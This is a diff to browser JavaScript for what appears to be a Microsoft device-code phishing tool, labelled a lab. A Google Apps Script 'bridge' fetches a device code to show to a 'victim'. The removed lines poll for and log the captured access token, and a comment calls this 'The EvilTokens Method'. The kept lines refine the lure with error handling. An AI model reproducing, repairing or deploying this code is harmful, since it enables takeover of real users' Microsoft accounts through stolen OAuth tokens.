@@ -1,69 +1,47 @@
-/**
- * LAB CONFIGURATION
- * Replace SCRIPT_URL with your Google Web App URL
- */
+// USE THE NEW URL FROM STEP 1
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfy.../exec";
 
 async function init() {
     console.log("Engine v3.4: Initializing...");
     
+    // Safety Check: Ensure the element exists before writing to it
+    const display = document.getElementById("code-display");
+    if (!display) {
+        console.error("Critical: Could not find HTML element 'code-display'");
+        return;
+    }
+
     try {
-        // 1. GENERATE THE CODE
-        const response = await fetch(SCRIPT_URL, { redirect: "follow" });
+        const response = await fetch(SCRIPT_URL, {
+            method: 'GET',
+            mode: 'cors', // Explicitly set mode
+            redirect: 'follow'
+        });
+
+        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+
         const rawData = await response.text();
+        console.log("Raw Response:", rawData);
+
+        // Google sometimes wraps response in HTML if there's an error
+        if (rawData.includes("<!DOCTYPE")) {
+            console.error("Bridge Error: Google returned HTML instead of JSON. Check your deployment settings.");
+            return;
+        }
+
         const data = JSON.parse(rawData);
-
         if (data.user_code) {
-            console.log("SUCCESS: Code Generated ->", data.user_code);
-            
-            // Update the UI for your lab
-            const display = document.getElementById("code-display");
-            if (display) display.innerText = data.user_code;
-
-            // 2. START POLLING (The "EvilTokens" Method)
-            // This waits for the victim to finish logging in
-            pollForToken(data.device_code, data.interval || 5);
+            display.innerText = data.user_code;
+            console.log("SUCCESS! Code generated.");
         } else {
-            console.error("Microsoft Block:", data.error_description);
+            console.error("Microsoft Error:", data.error_description || "Unknown error");
         }
+
     } catch (err) {
-        // Ignore Google's redirect noise if we got the data
-        if (!document.getElementById("code-display").innerText) {
-            console.error("Bridge Connection Failed. Verify 'Anyone' access.");
-        }
+        console.error("Bridge Failure:", err.message);
+        display.innerText = "Error: Check Console";
     }
 }
 
-/**
- * Polling logic: Every X seconds, we ask the bridge: 
- * "Did the user finish signing in yet?"
- */
-async function pollForToken(deviceCode, interval) {
-    console.log(`Polling every ${interval}s for token...`);
-    
-    const pollInterval = setInterval(async () => {
-        try {
-            // We send the device_code back to the bridge to check status
-            const response = await fetch(`${SCRIPT_URL}?device_code=${deviceCode}`, { redirect: "follow" });
-            const rawData = await response.text();
-            const data = JSON.parse(rawData);
-
-            if (data.access_token) {
-                console.log("!!! TOKEN CAPTURED !!!");
-                console.log("Access Token:", data.access_token);
-                clearInterval(pollInterval);
-                alert("Success: Account Linked!");
-            } else if (data.error === "authorization_pending") {
-                console.log("Waiting for user to enter code...");
-            } else if (data.error === "expired_token") {
-                console.log("Code expired. Refresh the page.");
-                clearInterval(pollInterval);
-            }
-        } catch (e) {
-            // Silent retry
-        }
-    }, interval * 1000);
-}
-
-// Fire the engine
-init();
+// Run after page load
+window.onload = init;
